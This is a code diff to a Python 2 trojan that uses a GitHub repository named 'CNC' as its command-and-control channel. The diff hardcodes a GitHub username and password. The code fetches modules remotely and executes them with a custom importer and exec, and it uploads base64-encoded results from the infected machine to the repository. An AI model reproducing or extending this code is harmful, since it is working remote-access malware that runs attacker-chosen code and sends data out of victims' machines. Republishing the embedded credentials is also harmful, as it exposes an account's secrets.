@@ -6,6 +6,7 @@ import random
 import threading
 import Queue
 import os
+import imp
 
 from github3 import login
 
@@ -16,10 +17,15 @@ data_path       = "data/%s/" %trojan_id
 trojan_modules  = []
 configured      = False
 task_queue      = Queue.Queue()
+USER            = "Bo3o2S"
+PASS            = "rltgjqm3346!!"
+
+os.environ['REQUESTS_CA_BUNDLE'] = "cacert.pem"
+
 
 def connect_to_github():
-    gh = login(username="Bo3o2S",password="rltgjqm3346!!")
-    repo = gh.repository("Bo3o2S","CNC")
+    gh = login(username=USER,password=PASS)
+    repo = gh.repository(USER,"CNC")
     branch = repo.branch("master")
 
     return gh, repo, branch
@@ -30,7 +36,7 @@ def get_file_contents(filepath):
 
     for filename in tree.tree:
         if filepath in filename.path:
-            print "[*] Found file %s" %filepath
+            print "[*] Found file [%s]" %filepath
             blob = repo.blob(filename._json_data['sha'])
 
             return blob.content
@@ -43,16 +49,23 @@ def get_trojan_config():
     configured  = True
 
     for task in config:
-
+        print task['module']
         if task['module'] not in sys.modules:
             exec ("import %s" % task['module'])
 
     return config
 
+def pull_result(result):
+    gh, repo, branch = connect_to_github()
+    gh.pull_request(USER, repo, 1)
+    print "[*] pull_result Finish..."
+    return None
+
 def store_module_result(data):
-    gh,repo,branch = connect_to_github()
+    gh, repo, branch = connect_to_github()
     remote_path = "data/%s/%d.data" %(trojan_id,random.randint(1000,100000))
     repo.create_file(remote_path, "Commit message", base64.b64encode(data))
+    pull_result(remote_path)
 
     return
 
@@ -62,8 +75,8 @@ class GitImporter(object):
 
     def find_module(self,fullname,path=None):
         if configured:
-            print "[*] Attempting to retrieve %s" %fullname
-            new_library = get_file_contents("moduels/%s" %fullname)
+            print "[*] Attempting to retrieve [%s]" %fullname
+            new_library = get_file_contents("modules/%s" %fullname)
 
             if new_library is not None:
                 self.current_module_code = base64.b64decode(new_library)
